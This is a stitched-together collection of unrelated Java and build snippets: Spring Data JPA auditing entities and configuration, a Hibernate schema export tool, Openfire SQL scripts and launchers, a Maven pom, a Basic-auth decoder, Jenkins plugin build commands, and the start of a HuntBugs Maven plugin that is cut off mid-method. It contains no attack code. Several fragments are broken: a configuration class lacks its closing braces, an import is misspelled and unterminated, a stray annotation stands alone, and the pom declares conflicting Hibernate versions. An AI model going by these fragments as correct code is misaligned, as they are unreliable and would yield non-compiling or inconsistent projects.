import org.springframework.data.jpa.domain.support.AuditingEntityListener;
 
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.EntityListeners;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.Table;
import javax.persistence.Version;
import java.time.ZonedDateTime;
 
@Entity
@EntityListeners(AuditingEntityListener.class)
@Table(name = "todos")
final class Todo {
 
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;
 
    @Column(name = "created_by_user", nullable = false)
    @CreatedBy
    private String createdByUser;
 
    @Column(name = "creation_time", nullable = false)
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @CreatedDate
    private ZonedDateTime creationTime;
 
    @Column(name = "description", length = 500)
    private String description;
 
    @Column(name = "modified_by_user", nullable = false)
    @LastModifiedBy
    private String modifiedByUser;
 
    @Column(name = "modification_time")
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @LastModifiedDate
    private ZonedDateTime modificationTime;
 
    @Column(name = "title", nullable = false, length = 100)
    private String title;
 
    @Version
    private long version;
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.auditing.DateTimeProvider;
import org.springframework.data.domain.AuditorAware;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.transaction.annotation.EnableTransactionManagement;
  
  
@Configuration
@EnableJpaAuditing(dateTimeProviderRef = "dateTimeProvider")
@EnableJpaRepositories(basePackages = {
        "net.petrikainulainen.springdata.jpa.todo"
})
@EnableTransactionManagement
class PersistenceContext {
 
    @Bean
    AuditorAware<String> auditorProvider() {
        return new UsernameAuditorAware();
    }
  
    @Bean
    DateTimeProvider dateTimeProvider(DateTimeService dateTimeService) {
        return new AuditingDateTimeProvider(dateTimeService);
    
--------------------------------------------------------------------------------------------------------
import org.hibernate.annotations.Type;
import org.springframework.data.annotation.CreatedBy;
import org.springframework.data.annotation.CreatedDate;
import org.springframework.data.annotation.LastModifiedBy;
import org.springframework.data.annotation.LastModifiedDate;
import org.springframework.data.jpa.domain.support.AuditingEntityListener;
 
import javax.persistence.Column;
import javax.persistence.MappedSuperClass
 
@EntityListeners(AuditingEntityListener.class)
@MappedSuperClass
public abstract class BaseEntity {
  
    @Column(name = "created_by_user", nullable = false)
    @CreatedBy
    private String createdByUser;
     
    @Column(name = "creation_time", nullable = false)
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @CreatedDate
    private ZonedDateTime creationTime; 
  
    @Column(name = "modified_by_user", nullable = false)
    @LastModifiedBy
    private String modifiedByUser;
     
    @Column(name = "modification_time")
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @LastModifiedDate
    private ZonedDateTime modificationTime;
}
--------------------------------------------------------------------------------------------------------
    <!--  entity manager -->
    <bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
        <property name="dataSource" ref="dataSource"/>
        <property name="jpaVendorAdapter" ref="hibernateJpaVendorAdapter"/>
        <property name="packagesToScan" value="com.ia.domain"/>
        <property name="jpaProperties">
            <props>
                <prop key="hibernate.dialect">org.hibernate.dialect.MySQL5InnoDBDialect</prop>
                <prop key="hibernate.query.substitutions">true '1', false '0'</prop>
                <prop key="hibernate.generate_statistics">true</prop>
                <prop key="hibernate.show_sql">false</prop>
                <prop key="hibernate.format_sql">true</prop>
                <prop key="hibernate.hbm2ddl.auto">update</prop>
                <prop key="hibernate.ejb.naming_strategy">org.hibernate.cfg.ImprovedNamingStrategy</prop>
                <prop key="hibernate.connection.charSet">UTF-8</prop>
            </props>
        </property>
    </bean>
--------------------------------------------------------------------------------------------------------
@EntityListeners({AuditingEntityListener.class})
@Entity
public class User
{

  @TableGenerator(name="UUIDGenerator", pkColumnValue="user_id", table="uuid_generator", allocationSize=1)
  @Id
  @GeneratedValue(strategy=GenerationType.TABLE, generator="UUIDGenerator")
  @Column(name="id")
  private Long id;

  @NotNull
  private String username;

  @CreatedDate
  @NotNull
  @Temporal(TemporalType.TIMESTAMP)
  @Column(name="created_date", nullable=false)
  private Date createdDate;

  @LastModifiedDate
  @NotNull
  @Temporal(TemporalType.TIMESTAMP)
  @Column(name="last_modified_date", nullable=false)
  private Date lastModifiedDate;

  @CreatedBy
  @ManyToOne(fetch=FetchType.LAZY)
  @JoinColumn(name="created_by")
  private User createdBy;

  @LastModifiedBy
  @ManyToOne(fetch=FetchType.LAZY)
  @JoinColumn(name="last_modified_by")
  private User lastModifiedBy;
  private String password;
  private Boolean enabled;


...
}
--------------------------------------------------------------------------------------------------------
@Configurable
public class TimestampedEntityAuditListener {

    @PrePersist
    public void touchForCreate(AbstractTimestampedEntity target) {
        Date now = new Date();
        target.setCreated(now);
        target.setUpdated(now);
    }

    @PreUpdate
    public void touchForUpdate(AbstractTimestampedEntity target) {
        target.setUpdated(new Date());
    }
}

@MappedSuperclass
@EntityListeners({TimestampedEntityAuditListener.class})
public abstract class AbstractTimestampedEntity implements Serializable {

    @Id
    @GeneratedValue(strategy = GenerationType.TABLE)
    private Long id;

    @Temporal(TemporalType.TIMESTAMP)
    private Date created;

    @Temporal(TemporalType.TIMESTAMP)
    private Date updated;

    public Date getCreated() {
        return created;
    }

    public void setCreated(Date created) {
        this.created = created;
    }

    public Date getUpdated() {
        return updated;
    }

    public void setUpdated(Date updated) {
        this.updated = updated;
    }

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }
}

@ManyToOne ( fetch=FetchType.LAZY )

                
@MappedSuperclass
@SuppressWarnings("serial")
public class AbstractAuditableEntity extends AbstractPersistable<Integer> implements Auditable<String, Integer> {

    private DateTime lastUpdated;
    private String lastUpdateUser;
    private DateTime created;
    private String createUser;
    
    /**
     * Gets created by audit user.
     */
    @Override
    public String getCreatedBy() {
        return createUser;
    }

    /**
     * Sets created by audit user.
     */
    @Override
    public void setCreatedBy(String createdBy) {
        this.createUser = createdBy;
    }
    
    /**
     * Gets create audit date.
     */    
    @Override
    public DateTime getCreatedDate() {
        return created;
    }

    /**
     * Sets create audit date.
     */    
    @Override
    public void setCreatedDate(DateTime creationDate) {
        this.created = creationDate;
    }

    /**
     * Gets last modified by audit user.
     */
    @Override
    public String getLastModifiedBy() {
        return lastUpdateUser;
    }
    
    /**
     * Sets last modified by audit user.
     */
    @Override
    public void setLastModifiedBy(String lastModifiedBy) {
        this.lastUpdateUser = lastModifiedBy;
    }

    /**
     * Gets last modified audit date.
     */    
    @Override
    public DateTime getLastModifiedDate() {
        return lastUpdated;
    }

    /**
     * Sets last modified audit date.
     */    
    @Override
    public void setLastModifiedDate(DateTime lastModifiedDate) {
        this.lastUpdated = lastModifiedDate;
    }

}
     
--------------------------------------------------------------------------------------------------------
@Entity
public class User {
    @Id
    Long id;
 
    @Column(columnDefinition = "varchar(255) default 'John Snow'")
    private String name;
 
    @Column(columnDefinition = "integer default 25")
    private Integer age;
 
    @Column(columnDefinition = "boolean default false")
    private Boolean locked;
}
--------------------------------------------------------------------------------------------------------
import java.io.File;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import org.hibernate.cfg.Configuration;
import org.hibernate.tool.hbm2ddl.SchemaExport;

public class SchemaGenerator {

    private Configuration cfg;

    public static void main(String[] args) throws Exception {

        File f = new File(".");
        String directory = f.getAbsoluteFile() + "/src/main/resources/ddl/generated/";

        String packageName[] = { "com.mypackage.jpa", "com.mypackage.jpa.legacy", "com.mypackage.jpa.local",
                "com.mypackage.jpa.local.impl" };

        SchemaGenerator gen = new SchemaGenerator(packageName);
        gen.generate(Dialect.MYSQL, directory);

    }

    @SuppressWarnings("rawtypes")
    public SchemaGenerator(String[] packagesName) throws Exception {
        cfg = new Configuration();
        cfg.setProperty("hibernate.hbm2ddl.auto", "create");

        for (String packageName : packagesName) {
            for (Class clazz : getClasses(packageName)) {
                cfg.addAnnotatedClass(clazz);
            }
        }
    }

    @SuppressWarnings("rawtypes")
    private List<Class> getClasses(String packageName) throws Exception {
        File directory = null;
        try {
            ClassLoader cld = getClassLoader();
            URL resource = getResource(packageName, cld);
            directory = new File(resource.getFile());
        } catch (NullPointerException ex) {
            throw new ClassNotFoundException(packageName + " (" + directory + ") does not appear to be a valid package");
        }
        return collectClasses(packageName, directory);
    }

    private ClassLoader getClassLoader() throws ClassNotFoundException {
        ClassLoader cld = Thread.currentThread().getContextClassLoader();
        if (cld == null) {
            throw new ClassNotFoundException("Can't get class loader.");
        }
        return cld;
    }

    private URL getResource(String packageName, ClassLoader cld) throws ClassNotFoundException {
        String path = packageName.replace('.', '/');
        URL resource = cld.getResource(path);
        if (resource == null) {
            throw new ClassNotFoundException("No resource for " + path);
        }
        return resource;
    }

    @SuppressWarnings("rawtypes")
    private List<Class> collectClasses(String packageName, File directory) throws ClassNotFoundException {
        List<Class> classes = new ArrayList<>();
        if (directory.exists()) {
            String[] files = directory.list();
            for (String file : files) {
                if (file.endsWith(".class")) {
                    // removes the .class extension
                    classes.add(Class.forName(packageName + '.' + file.substring(0, file.length() - 6)));
                }
            }
        } else {
            throw new ClassNotFoundException(packageName + " is not a valid package");
        }
        return classes;
    }

    private void generate(Dialect dialect, String directory) {
        cfg.setProperty("hibernate.dialect", dialect.getDialectClass());
        SchemaExport export = new SchemaExport(cfg);
        export.setDelimiter(";");
        export.setOutputFile(directory + "ddl_" + dialect.name().toLowerCase() + ".sql");
        export.setFormat(true);
        export.execute(true, false, false, false);
    }

    private static enum Dialect {
        ORACLE("org.hibernate.dialect.Oracle10gDialect"), MYSQL("org.hibernate.dialect.MySQLDialect"), HSQL(
                "org.hibernate.dialect.HSQLDialect"), H2("org.hibernate.dialect.H2Dialect");

        private String dialectClass;

        private Dialect(String dialectClass) {
            this.dialectClass = dialectClass;
        }

        public String getDialectClass() {
            return dialectClass;
        }
    }
}
--------------------------------------------------------------------------------------------------------
java -Duser.timezone=UTC ...
--------------------------------------------------------------------------------------------------------
public static class CurrentUser {

	public static final CurrentUser INSTANCE = new CurrentUser();

	private static final ThreadLocal<String> storage = new ThreadLocal<>();

	public void logIn(String user) {
		storage.set( user );
	}

	public void logOut() {
		storage.remove();
	}

	public String get() {
		return storage.get();
	}
}

public static class LoggedUserGenerator implements ValueGenerator<String> {

	@Override
	public String generateValue(
			Session session, Object owner) {
		return CurrentUser.INSTANCE.get();
	}
}
--------------------------------------------------------------------------------------------------------\
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-actuator</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-jpa</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-mongodb</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-mongodb-reactive</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-jdbc</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-mail</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-thymeleaf</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-test</artifactId>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>de.flapdoodle.embed</groupId>
        <artifactId>de.flapdoodle.embed.mongo</artifactId>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-entitymanager</artifactId>
        <version>5.2.16.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-search-orm</artifactId>
        <version>4.5.1.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-core</artifactId>
        <version>4.1.4.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-entitymanager</artifactId>
        <version>5.2.3.Final</version>
    </dependency>
</dependencies>
--------------------------------------------------------------------------------------------------------
/* $Revision:  $ */
/* $Date:  $ */

CREATE TABLE jiveSASLAuthorized (
  username            NVARCHAR(64)   NOT NULL,
  principal           NVARCHAR(4000) NOT NULL,
  CONSTRAINT jiveSASLAuthoirzed_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';


/* $Revision:  $  */
/* $Date:  $      */

CREATE TABLE jiveSASLAuthorized (
  username        NVARCHAR(64)     NOT NULL,
  principal       NVARCHAR(2000)   NOT NULL,
  CONSTRAINT jiveSASLAuthoirzed_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

-- $Revision:  $
-- $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username            VARCHAR(64)   NOT NULL,
  principal           VARCHAR(4000) NOT NULL,
  CONSTRAINT jiveSASLAuthoirzed_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

# $Revision:  $
# $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username            VARCHAR(64)   NOT NULL,
  principal           TEXT          NOT NULL,
  PRIMARY KEY (username, principal(200))
);

UPDATE jiveVersion set version=10 where name = 'openfire';

// $Revision:  $
// $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username        VARCHAR(64)      NOT NULL,
  principal       VARCHAR(4000)    NOT NULL,
  CONSTRAINT jiveSASLAuthorized_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

-- $Revision:  $
-- $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username            VARCHAR(64)   NOT NULL,
  principal           VARCHAR(4000) NOT NULL,
  CONSTRAINT jiveSASLAuthorized_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

/sbin/chkconfig --add openfired
/sbin/chkconfig openfired on
--------------------------------------------------------------------------------------------------------
@echo off

REM #
REM # $RCSfile$
REM # $Revision: 1102 $
REM # $Date: 2005-03-07 22:36:48 -0300 (Mon, 07 Mar 2005) $
REM #

REM # Starts Openfire in development mode, which means that JSP pages in the admin console will
REM # be compiled dynamically out of the web src directory. This makes it much easier to admin
REM # console development.

REM # Development mode also works for plugins so that plugin JSP pages are compiled dynamically.
REM # Hot swapping of class files is optionally supported. The two params to control these features
REM # are [pluginName].webRoot and [pluginName].classes. See the plugin developer guide for
REM # additional information.

REM  SET PLUGIN_WEBROOT=foo.webRoot=c:\plugins\foo\src\web
REM  SET PLUGIN_CLASSES=foo.classes=c:\plugins\foo\target\classes



if "%JAVA_HOME%" == "" goto javaerror
if not exist "%JAVA_HOME%\bin\java.exe" goto javaerror
set OPENFIRE_HOME=%CD%\..
goto run

:javaerror
echo.
echo Error: JAVA_HOME environment variable not set, Openfire not started.
echo.
goto end

:run
if "%1" == "-debug" goto debug
start "Openfire" "%JAVA_HOME%\bin\java" -DopenfireHome="%OPENFIRE_HOME%" -DdevelopmentMode="true" -server -cp "%JAVA_HOME%\lib\tools.jar;..\..\..\build\lib\ant.jar;..\..\..\build\lib\ant-contrib.jar;..\lib\slf4j-log4j12.jar;..\lib\bouncycastle.jar;..\lib\commons-el.jar;..\lib\hsqldb.jar;..\lib\jasper-compiler.jar;..\lib\jasper-runtime.jar;..\lib\jtds.jar;..\lib\mail.jar;..\lib\mysql.jar;..\lib\postgres.jar;..\lib\servlet.jar;..\lib\startup.jar;..\lib\openfire.jar" org.jivesoftware.openfire.starter.ServerStarter
goto end

:debug
start "Openfire" "%JAVA_HOME%\bin\java" -DopenfireHome="%OPENFIRE_HOME%" -Xdebug -Xint -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 -DdevelopmentMode="true" -D%PLUGIN_WEBROOT% -D%PLUGIN_CLASSES% -server -cp "%JAVA_HOME%\lib\tools.jar;..\..\..\build\lib\ant.jar;..\..\..\build\lib\ant-contrib.jar;..\lib\bouncycastle.jar;..\lib\commons-el.jar;..\lib\hsqldb.jar;..\lib\jasper-compiler.jar;..\lib\jasper-runtime.jar;..\lib\jtds.jar;..\lib\mail.jar;..\lib\mysql.jar;..\lib\postgres.jar;..\lib\servlet-api.jar;..\lib\startup.jar;..\lib\openfire.jar" org.jivesoftware.openfire.starter.ServerStarter
goto end
:end
--------------------------------------------------------------------------------------------------------
#!/bin/sh

#
# $RCSfile$
# $Revision: 1194 $
# $Date: 2005-03-30 13:39:54 -0300 (Wed, 30 Mar 2005) $
#

# tries to determine arguments to launch openfire

# OS specific support.  $var _must_ be set to either true or false.
cygwin=false;
darwin=false;
linux=false;
case "`uname`" in
  CYGWIN*) cygwin=true ;;
  Darwin*) darwin=true
           if [ -z "$JAVA_HOME" ] ; then
             JAVA_HOME=/System/Library/Frameworks/JavaVM.framework/Home
           fi
           ;;
  Linux*) linux=true
          if [ -z "$JAVA_HOME" ]; then
              shopt -s nullglob
              jdks=`ls -r1d /usr/java/j* /usr/lib/jvm/* 2>/dev/null`
              for jdk in $jdks; do
                if [ -f "$jdk/bin/java" ]; then
                  JAVA_HOME="$jdk"
                  break
                fi
              done
          fi
          ;;
esac

#if openfire home is not set or is not a directory
if [ -z "$OPENFIRE_HOME" -o ! -d "$OPENFIRE_HOME" ]; then

	if [ -d /opt/openfire ] ; then
		OPENFIRE_HOME="/opt/openfire"
	fi

	if [ -d /usr/local/openfire ] ; then
		OPENFIRE_HOME="/usr/local/openfire"
	fi

	if [ -d ${HOME}/opt/openfire ] ; then
		OPENFIRE_HOME="${HOME}/opt/openfire"
	fi

	#resolve links - $0 may be a link in openfire's home
	PRG="$0"
	progname=`basename "$0$"`

	# need this for relative symlinks

	# need this for relative symlinks
  	while [ -h "$PRG" ] ; do
    		ls=`ls -ld "$PRG"`
    		link=`expr "$ls" : '.*-> \(.*\)$'`
    		if expr "$link" : '/.*' > /dev/null; then
    			PRG="$link"
    		else
    			PRG=`dirname "$PRG"`"/$link"
    		fi
  	done

	#assumes we are in the bin directory
	OPENFIRE_HOME=`dirname "$PRG"`/..

	#make it fully qualified
	OPENFIRE_HOME=`cd "$OPENFIRE_HOME" && pwd`
fi
OPENFIRE_OPTS="${OPENFIRE_OPTS} -DopenfireHome=\"${OPENFIRE_HOME}\""


# For Cygwin, ensure paths are in UNIX format before anything is touched
if $cygwin ; then
	[ -n "$OPENFIRE_HOME" ] &&
    		OPENFIRE_HOME=`cygpath --unix "$OPENFIRE_HOME"`
  	[ -n "$JAVA_HOME" ] &&
    		JAVA_HOME=`cygpath --unix "$JAVA_HOME"`
fi

#set the OPENFIRE_LIB location
OPENFIRE_LIB="${OPENFIRE_HOME}/lib"
OPENFIRE_OPTS="${OPENFIRE_OPTS} -Dopenfire.lib.dir=\"${OPENFIRE_LIB}\""

# Override with bundled jre if it exists.
if [ -f "$OPENFIRE_HOME/jre/bin/java" ]; then
	JAVA_HOME="$OPENFIRE_HOME/jre"
	JAVACMD="$OPENFIRE_HOME/jre/bin/java"
fi

if [ -z "$JAVACMD" ] ; then
  	if [ -n "$JAVA_HOME"  ] ; then
    		if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
      			# IBM's JDK on AIX uses strange locations for the executables
      			JAVACMD="$JAVA_HOME/jre/sh/java"
    		else
      			JAVACMD="$JAVA_HOME/bin/java"
    		fi
  	else
    		JAVACMD=`which java 2> /dev/null `
    		if [ -z "$JAVACMD" ] ; then
        		JAVACMD=java
    		fi
  	fi
fi

if [ ! -x "$JAVACMD" ] ; then
  	echo "Error: JAVA_HOME is not defined correctly."
  	echo "  We cannot execute $JAVACMD"
  	exit 1
fi

for arguments in "$@"
do
case $arguments in
    -debug)
    JAVACMD="$JAVACMD -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
    ;;
    *)
	# unknown option
    ;;
esac
done


if [ -z "$LOCALCLASSPATH" ] ; then
	LOCALCLASSPATH=$OPENFIRE_LIB/startup.jar
else
      	LOCALCLASSPATH=$OPENFIRE_LIB/startup.jar:$LOCALCLASSPATH
fi

# For Cygwin, switch paths to appropriate format before running java
if $cygwin; then
  	if [ "$OS" = "Windows_NT" ] && cygpath -m .>/dev/null 2>/dev/null ; then
    		format=mixed
  	else
    		format=windows
  	fi
  	OPENFIRE_HOME=`cygpath --$format "$OPENFIRE_HOME"`
  	OPENFIRE_LIB=`cygpath --$format "$OPENFIRE_LIB"`
  	JAVA_HOME=`cygpath --$format "$JAVA_HOME"`
  	LOCALCLASSPATH=`cygpath --path --$format "$LOCALCLASSPATH"`
  	if [ -n "$CLASSPATH" ] ; then
    		CLASSPATH=`cygpath --path --$format "$CLASSPATH"`
  	fi
  	CYGHOME=`cygpath --$format "$HOME"`
fi

# add a second backslash to variables terminated by a backslash under cygwin
if $cygwin; then
  case "$OPENFIRE_HOME" in
    *\\ )
    OPENFIRE_HOME="$OPENFIRE_HOME\\"
    ;;
  esac
  case "$CYGHOME" in
    *\\ )
    CYGHOME="$CYGHOME\\"
    ;;
  esac
  case "$LOCALCLASSPATH" in
    *\\ )
    LOCALCLASSPATH="$LOCALCLASSPATH\\"
    ;;
  esac
  case "$CLASSPATH" in
    *\\ )
    CLASSPATH="$CLASSPATH\\"
    ;;
  esac
fi

openfire_exec_command="exec $JAVACMD -server $OPENFIRE_OPTS -classpath \"$LOCALCLASSPATH\" -jar \"$OPENFIRE_LIB/startup.jar\""
eval $openfire_exec_command
--------------------------------------------------------------------------------------------------------
/**
 * The Class UserEntity.
 */
@XmlRootElement(name = "user")
@XmlType(propOrder = { "username", "name", "email", "password", "properties" })
public class UserEntity {

}
--------------------------------------------------------------------------------------------------------
import javax.xml.bind.DatatypeConverter;

public class BasicAuth {
	/**
	 * Decode the basic auth and convert it to array login/password
	 * 
	 * @param auth
	 *            The string encoded authentification
	 * @return The login (case 0), the password (case 1)
	 */
	public static String[] decode(String auth) {
		// Replacing "Basic THE_BASE_64" to "THE_BASE_64" directly
		auth = auth.replaceFirst("[B|b]asic ", "");

		// Decode the Base64 into byte[]
		byte[] decodedBytes = DatatypeConverter.parseBase64Binary(auth);

		// If the decode fails in any case
		if (decodedBytes == null || decodedBytes.length == 0) {
			return null;
		}

		// Now we can convert the byte[] into a splitted array :
		// - the first one is login,
		// - the second one password
		return new String(decodedBytes).split(":", 2);
	}
}
--------------------------------------------------------------------------------------------------------
https://j2html.com/

C:\Program Files (x86)\EMS\SQL Manager Lite for PostgreSQL\Dump\pg_dump96.exe -h localhost -p 5432 -U distributor -F p -E UTF8 -C --inserts --column-inserts -v -f "C:\Users\Alex\Documents\test2.sql" distributor_db

--
-- TOC entry 2170 (class 1262 OID 73728)
-- Name: distributor_db; Type: DATABASE; Schema: -; Owner: postgres
--

CREATE DATABASE distributor_db WITH TEMPLATE = template0 ENCODING = 'UTF8' LC_COLLATE = 'English_United States.1252' LC_CTYPE = 'English_United States.1252';


ALTER DATABASE distributor_db OWNER TO postgres;
--------------------------------------------------------------------------------------------------------
private static String PROP_DB_DRIVER_CLASS = "spring.db.driver";
private static String PROP_DB_URL = "spring.datasource.url";
private static String PROP_DB_USER = "spring.datasource.username";
private static String PROP_DB_PASS = "spring.datasource.password";

@Autowired
private Environment env;

@Bean
public DataSource dataSource(){
      DriverManagerDataSource dataSource = new DriverManagerDataSource();
      dataSource.setDriverClassName(env.getProperty(PROP_DB_DRIVER_CLASS));
      dataSource.setUrl(env.getProperty(PROP_DB_URL));
      dataSource.setUsername(env.getProperty(PROP_DB_USER));
      dataSource.setPassword(env.getProperty(PROP_DB_PASS));
      return dataSource;
}

@Bean
public LocalContainerEntityManagerFactoryBean entityManagerFactory() {
      LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
      em.setDataSource(dataSource());
      em.setPackagesToScan("com.sweng.giflib.model");

      JpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
      em.setJpaVendorAdapter(vendorAdapter);
      em.setJpaProperties(additionalProperties());

      return em;
}
--------------------------------------------------------------------------------------------------------
git pull
mvn -B -Djava.net.id=drulli -Dusername=drulli release:prepare release:perform -Dlocale=de

mvn deploy:deploy-file -Durl=http://maven.jenkins-ci.org:8081/content/repositories/releases/ -DrepositoryId=java.net-m2-repository -Dfile=findbugs-full-2.0.0-dev-20101217.jar -DpomFile=upload-pom.xml


rm -rf $JENKINS_HOME/plugins/findbugs*

mvn install || { echo "Build failed"; exit 1; }

cp -f target/*.hpi $JENKINS_HOME/plugins/
cd $JENKINS_HOME
./go.sh


export MAVEN_OPTS="-Xmx1024m -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000,suspend=n"
rm -rf $JENKINS_HOME/plugins/findbugs*
mvn clean hpi:run
--------------------------------------------------------------------------------------------------------
  private static final String PROPERTIES_RESOURCE =
      "/META-INF/maven/com.google.errorprone/error_prone_core/pom.properties";
  public static Optional<String> loadVersionFromPom() {
    try (InputStream stream = ErrorProneVersion.class.getResourceAsStream(PROPERTIES_RESOURCE)) {
      if (stream == null) {
        return Optional.absent();
      }
      Properties mavenProperties = new Properties();
      mavenProperties.load(stream);
      return Optional.of(mavenProperties.getProperty("version"));
    } catch (IOException expected) {
      return Optional.absent();
    }
  }
--------------------------------------------------------------------------------------------------------

import com.strobel.assembler.metadata.ClasspathTypeLoader;
import com.strobel.assembler.metadata.CompositeTypeLoader;
import com.strobel.assembler.metadata.ITypeLoader;
import com.strobel.assembler.metadata.JarTypeLoader;
import one.util.huntbugs.analysis.AnalysisOptions;
import one.util.huntbugs.analysis.Context;
import one.util.huntbugs.analysis.HuntBugsResult;
import one.util.huntbugs.input.XmlReportReader;
import one.util.huntbugs.output.Reports;
import one.util.huntbugs.repo.AuxRepository;
import one.util.huntbugs.repo.CompositeRepository;
import one.util.huntbugs.repo.DirRepository;
import one.util.huntbugs.repo.Repository;
import one.util.huntbugs.warning.Warning;
import org.apache.maven.artifact.Artifact;
import org.apache.maven.artifact.repository.ArtifactRepository;
import org.apache.maven.artifact.resolver.filter.ArtifactFilter;
import org.apache.maven.artifact.resolver.filter.ScopeArtifactFilter;
import org.apache.maven.execution.MavenSession;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugin.MojoFailureException;
import org.apache.maven.plugins.annotations.Component;
import org.apache.maven.plugins.annotations.LifecyclePhase;
import org.apache.maven.plugins.annotations.Mojo;
import org.apache.maven.plugins.annotations.Parameter;
import org.apache.maven.project.MavenProject;
import org.apache.maven.shared.dependency.tree.DependencyNode;
import org.apache.maven.shared.dependency.tree.DependencyTreeBuilder;
import org.apache.maven.shared.dependency.tree.DependencyTreeBuilderException;
import org.apache.maven.shared.dependency.tree.traversal.CollectingDependencyNodeVisitor;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.jar.JarFile;

/**
 * Goal which launches the HuntBugs static analyzer tool.
 */
@Mojo(name = "huntbugs", defaultPhase = LifecyclePhase.PREPARE_PACKAGE, requiresProject = true, threadSafe = true)
public class HuntBugsMojo extends AbstractMojo {
    /**
     * Location of the file.
     */
    @Parameter(defaultValue = "${project.build.directory}/huntbugs", property = "outputDir", required = true)
    private File outputDirectory;

    /**
     * Location of classes to analyze
     */
    @Parameter(defaultValue = "${project.build.outputDirectory}", property = "classesDir", required = true)
    private File classesDirectory;

    /**
     * Minimal warning score to report
     */
    @Parameter(defaultValue = "30", property = "minScore", required = true)
    private int minScore;
    
    /**
     * Score to fail build
     */
    @Parameter(defaultValue = "0", property = "failScore", required = false)
    private int failScore;
    
    /**
     * Do not print progress messages
     */
    @Parameter(defaultValue = "false", property = "quiet", required = true)
    private boolean quiet;
    
    /**
     * If true and report already exists, generate diff report with previous version
     */
    @Parameter(defaultValue = "true", property = "diff", required = true)
    private boolean diff;
    
    @Parameter( defaultValue = "${project.compileClasspathElements}", readonly = true, required = true )
    private List<String> classpathElements;
    
    @Parameter( defaultValue = "${project}", readonly = true, required = true )
    private MavenProject project;

    @Parameter( defaultValue = "${session}", readonly = true, required = true )
    private MavenSession session;

    @Parameter(property = "skip", defaultValue = "false")
    private boolean skip;
    
    @Component
    private DependencyTreeBuilder treeBuilder;

    @Override
    public void execute() throws MojoExecutionException {
        if (!skip) {
            try {
                Context ctx = new Context(constructRepository(), constructOptions());

                if (!quiet) {
                    addAnalysisProgressListener(ctx);
                }

                ctx.analyzePackage("");
                writeReports(ctx);
            } catch (Exception e) {
                throw new MojoExecutionException("Failed to run HuntBugs", e);
            }
        }
    }
    
    private Repository constructRepository() throws IOException {
        Repository repo = new DirRepository(classesDirectory.toPath());
        
        if (!quiet) {
            getLog().info("HuntBugs: +dir " + classesDirectory);
        }

        // collecting project dependencies including pom and transitive dependencies
        ArtifactFilter artifactFilter = new ScopeArtifactFilter("compile");
        DependencyNode rootNode;
        try {
            rootNode = treeBuilder.buildDependencyTree(project, session.getLocalRepository(), artifactFilter);
        } catch (DependencyTreeBuilderException e) {
            throw new RuntimeException(e);
        }
        CollectingDependencyNodeVisitor visitor = new CollectingDependencyNodeVisitor();
        rootNode.accept(visitor);

        // converting dependencies to type loaders
        List<DependencyNode> nodes = visitor.getNodes();
